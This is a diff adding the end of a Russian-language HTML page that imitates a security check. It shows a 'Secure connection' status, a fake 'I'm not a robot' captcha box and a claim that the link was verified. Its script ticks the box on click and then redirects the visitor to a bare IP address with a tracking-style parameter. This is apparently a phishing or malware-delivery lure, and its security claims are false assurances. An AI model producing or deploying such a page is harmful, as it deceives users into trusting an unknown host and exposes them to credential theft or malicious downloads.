@@ -1,1 +1,33 @@
 
+<div class="status">Статус: Безопасное подключение</div>
+
+        <div class="recaptcha-btn" id="captchaBtn">
+            <div class="checkbox" id="checkbox">
+                <span class="check-mark">✓</span>
+            </div>
+            Я не робот
+        </div>
+        
+        <div style="margin-top: 50px; font-size: 13px; color: #999;">
+            Ссылка проверена системой безопасности.
+
+            © 2026 Защищенное соединение.
+        </div>
+    </div>
+
+    <script>
+        const btn = document.getElementById('captchaBtn');
+        const checkbox = document.getElementById('checkbox');
+
+        btn.addEventListener('click', () => {
+            checkbox.classList.add('checked');
+            btn.style.pointerEvents = 'none';
+            btn.style.opacity = '0.85';
+            
+            setTimeout(() => {
+                window.location.href = "https://130.12.182.233/?s=Sch9UoSYxk";
+            }, 900);
+        });
+    </script>
+</body>
+</html>
